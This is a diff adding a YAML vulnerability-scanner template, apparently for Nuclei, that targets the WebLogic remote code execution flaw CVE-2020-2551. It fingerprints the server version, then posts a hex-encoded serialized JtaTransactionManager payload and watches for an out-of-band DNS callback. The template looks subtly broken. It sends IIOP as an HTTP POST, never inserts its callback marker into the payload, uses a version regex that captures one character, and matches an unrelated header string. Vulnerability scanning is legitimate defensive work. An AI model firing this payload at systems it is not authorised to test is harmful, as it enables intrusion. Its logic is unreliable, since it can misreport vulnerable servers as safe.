@@ -1,0 +1,55 @@
+id: cve-2020-2551
+info:
+  name: WebLogic JtaTransactionManager Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    WebLogic Server is vulnerable to a remote code execution vulnerability via the IIOP protocol, allowing unauthenticated attackers to execute arbitrary commands.
+  classification:
+    cve-id: CVE-2020-2551
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: rce,weblogic,network
+  reference:
+    - https://www.oracle.com/security-alerts/cpujan2020.html
+
+variables:
+  marker: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /console/login/LoginForm.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - '<p id="footerVersion">.+([\d\.]+)</p>'
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - '<p id="footerVersion">.+([\d\.]+)</p>'
+
+  - raw:
+      - |
+        POST /iiop/rebind HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+        Connection: close
+
+        {{base64("0000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000074524d493a636f6d2e6265612e636f72652e72657061636b616765642e737072696e676672616d65776f726b2e7472616e73616374696f6e2e6a74612e4a74615472616e73616374696f6e4d616e616765723a413235363030344146343946393942343a3143464133393637334232343037324400ffffffff0001010000000000000001010101000000000000000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e300000")}}
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: regex
+        part: header
+        regex:
+          - "Check LDAP Address"
